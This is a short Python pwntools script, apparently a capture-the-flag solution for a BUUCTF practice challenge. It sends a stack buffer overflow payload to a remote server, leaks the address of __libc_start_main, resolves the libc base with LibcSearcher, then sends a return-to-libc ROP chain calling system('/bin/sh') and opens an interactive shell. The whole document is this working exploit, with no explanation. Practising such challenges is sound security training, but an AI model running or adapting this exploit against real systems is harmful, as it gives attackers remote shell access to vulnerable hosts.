from pwn import *
from LibcSearcher import *
context(arch='amd64', log_level='debug')

# io = process('./pwn')
io = remote('node4.buuoj.cn', 28675)

write = 0x400503
read_write = 0x4004ed
poprdi_ret = 0x4005a3

payload = cyclic(0x10)
payload += p64(write)
payload += p64(write)
payload += p64(read_write)

io.sendline(payload)

libc_start_main = u64(io.recv()[-8:]) - 231
print(hex(libc_start_main))
libc = LibcSearcher('__libc_start_main', libc_start_main)
base = libc_start_main - libc.dump('__libc_start_main')

sys = base + libc.dump('system')
binsh = base + libc.dump('str_bin_sh')

payload = cyclic(0x10)
payload += p64(poprdi_ret)
payload += p64(binsh)
payload += p64(sys)

io.sendline(payload)

io.interactive()